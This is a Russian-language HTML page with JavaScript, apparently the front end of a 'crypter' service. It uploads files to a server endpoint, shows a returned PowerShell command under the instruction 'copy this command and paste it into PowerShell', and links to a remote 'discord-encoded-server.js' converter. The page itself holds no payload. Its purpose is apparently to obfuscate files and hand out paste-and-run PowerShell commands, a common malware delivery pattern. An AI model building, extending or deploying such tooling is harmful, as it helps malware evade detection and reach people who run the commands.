<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>crypter Uploader</title>
    <style>
        :root {
            --primary: #2c3e50;
            --accent: #3498db;
            --bg: #f8f9fa;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: var(--bg);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }

        .container {
            background: white;
            padding: 2rem;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 500px;
        }

        h1 {
            text-align: center;
            color: var(--primary);
            margin-bottom: 2rem;
        }

        .upload-area {
            border: 2px dashed #ccc;
            border-radius: 8px;
            padding: 2rem;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s;
        }

        .upload-area:hover, .upload-area.dragover {
            border-color: var(--accent);
            background: #f0f7ff;
        }

        .upload-icon {
            font-size: 3rem;
            color: var(--accent);
            margin-bottom: 1rem;
        }

        #fileInput {
            display: none;
        }

        .file-info {
            margin-top: 1.5rem;
            padding: 1rem;
            background: #f1f2f6;
            border-radius: 6px;
            display: none;
        }

        .file-info.show {
            display: block;
        }

        .file-name {
            font-weight: bold;
            color: var(--primary);
            word-break: break-all;
        }

        .upload-btn {
            display: block;
            width: 100%;
            padding: 1rem;
            background: var(--accent);
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 1.1rem;
            font-weight: bold;
            cursor: pointer;
            margin-top: 1.5rem;
            transition: background 0.3s;
        }

        .upload-btn:hover {
            background: #2980b9;
        }

        .upload-btn:disabled {
            background: #bdc3c7;
            cursor: not-allowed;
        }

        .progress {
            margin-top: 1.5rem;
            height: 8px;
            background: #eee;
            border-radius: 4px;
            overflow: hidden;
            display: none;
        }

        .progress.show {
            display: block;
        }

        .progress-bar {
            height: 100%;
            background: var(--accent);
            width: 0%;
            transition: width 0.3s;
        }

        .status {
            text-align: center;
            margin-top: 1rem;
            font-size: 0.9rem;
            color: #666;
            display: none;
        }

        .status.show {
            display: block;
        }

        #result {
            margin-top: 1.5rem;
            padding: 1rem;
            background: #e8f6ef;
            border-left: 4px solid #2ecc71;
            border-radius: 4px;
            display: none;
        }

        #result.show {
            display: block;
        }

        .powershell-cmd {
            background: #2c3e50;
            color: #ecf0f1;
            padding: 10px;
            border-radius: 4px;
            font-family: monospace;
            font-size: 0.85rem;
            margin-top: 10px;
            word-break: break-all;
            white-space: pre-wrap;
            position: relative;
        }

        .copy-btn {
            background: #34495e;
            color: white;
            border: none;
            padding: 4px 8px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 0.7rem;
            margin-top: 5px;
        }

        .copy-btn:hover {
            background: #465e75;
        }

        .download-btn {
            transition: transform 0.2s;
        }
        .download-btn:hover {
            transform: scale(1.05);
            background: #219150;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>📤 crypter Uploader</h1>
        
        <div class="upload-area" id="uploadArea">
            <div class="upload-icon">📁</div>
            <div class="upload-text">
                Перетащи файл сюда или <span>кликни для выбора</span>
            </div>
        </div>
        
        <input type="file" id="fileInput" multiple>
        
        <div style="text-align: center; margin: 10px 0;">
            <a href="https://raw.githubusercontent.com/HANTERINI/feasdxsz/main/discord-encoded-server.js" download class="download-btn" style="text-decoration: none; display: inline-block; padding: 10px 20px; background: #27ae60; color: white; border-radius: 5px; font-weight: bold;">
                📥 Скачать конвертер (.js)
            </a>
        </div>
        
        <div class="file-info" id="fileInfo">
            <div class="file-name" id="fileName"></div>
            <div id="fileSize"></div>
        </div>
        
        <button class="upload-btn" id="uploadBtn">Загрузить на crypter</button>
        
        <div class="progress" id="progress">
            <div class="progress-bar" id="progressBar"></div>
        </div>
        
        <div class="status" id="status"></div>

        <div id="result">
            <div style="color: #27ae60; font-weight: bold; margin-bottom: 8px;">✅ Файл загружен и зашифрован!</div>
            <div style="font-size: 0.9rem;">Скопируй эту команду и вставь в PowerShell:</div>
            <div class="powershell-cmd" id="powershellCmd"></div>
            <button class="copy-btn" id="copyBtn">Скопировать команду</button>
        </div>
    </div>

    <script>
        const uploadArea = document.getElementById('uploadArea');
        const fileInput = document.getElementById('fileInput');
        const fileInfo = document.getElementById('fileInfo');
        const fileName = document.getElementById('fileName');
        const fileSize = document.getElementById('fileSize');
        const uploadBtn = document.getElementById('uploadBtn');
        const progress = document.getElementById('progress');
        const progressBar = document.getElementById('progressBar');
        const status = document.getElementById('status');
        const result = document.getElementById('result');
        const powershellCmd = document.getElementById('powershellCmd');
        const copyBtn = document.getElementById('copyBtn');

        let selectedFiles = [];

        uploadArea.addEventListener('click', () => fileInput.click());

        uploadArea.addEventListener('dragover', (e) => {
            e.preventDefault();
            uploadArea.classList.add('dragover');
        });

        uploadArea.addEventListener('dragleave', () => {
            uploadArea.classList.remove('dragover');
        });

        uploadArea.addEventListener('drop', (e) => {
            e.preventDefault();
            uploadArea.classList.remove('dragover');
            handleFiles(e.dataTransfer.files);
        });

        fileInput.addEventListener('change', (e) => {
            handleFiles(e.target.files);
        });

        function handleFiles(files) {
            selectedFiles = Array.from(files);
            if (selectedFiles.length > 0) {
                fileInfo.classList.add('show');
                fileName.textContent = selectedFiles.map(f => f.name).join(', ');
                const totalSize = selectedFiles.reduce((acc, f) => acc + f.size, 0);
                fileSize.textContent = `Размер: ${formatFileSize(totalSize)}`;
            }
        }

        function formatFileSize(bytes) {
            if (bytes === 0) return '0 Bytes';
            const k = 1024;
            const sizes = ['Bytes', 'KB', 'MB', 'GB'];
            const i = Math.floor(Math.log(bytes) / Math.log(k));
            return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
        }

        uploadBtn.addEventListener('click', async () => {
            if (selectedFiles.length === 0) return;

            uploadBtn.disabled = true;
            progress.classList.add('show');
            status.classList.add('show');
            result.classList.remove('show');

            const formData = new FormData();
            formData.append('reqtype', 'fileupload');
            selectedFiles.forEach(file => {
                formData.append('fileToUpload', file);
            });

            try {
                status.textContent = 'Загрузка...';
                progressBar.style.width = '50%';

                const response = await fetch('/api/upload', {
                    method: 'POST',
                    body: formData
                });

                progressBar.style.width = '100%';

                if (!response.ok) {
                    throw new Error('Ошибка сервера');
                }

                const responseData = await response.json();
                
                if (responseData.success) {
                    powershellCmd.textContent = responseData.command;
                    result.classList.add('show');
                    status.textContent = 'Готово!';
                } else {
                    throw new Error(responseData.error || 'Ошибка загрузки');
                }

            } catch (error) {
                status.textContent = 'Ошибка: ' + error.message;
                status.style.color = '#e74c3c';
            } finally {
                uploadBtn.disabled = false;
            }
        });

        copyBtn.addEventListener('click', () => {
            const range = document.createRange();
            range.selectNode(powershellCmd);
            window.getSelection().removeAllRanges();
            window.getSelection().addRange(range);
            document.execCommand('copy');
            window.getSelection().removeAllRanges();
            
            const originalText = copyBtn.textContent;
            copyBtn.textContent = 'Скопировано!';
            setTimeout(() => {
                copyBtn.textContent = originalText;
            }, 2000);
        });
    </script>
</body>
</html>
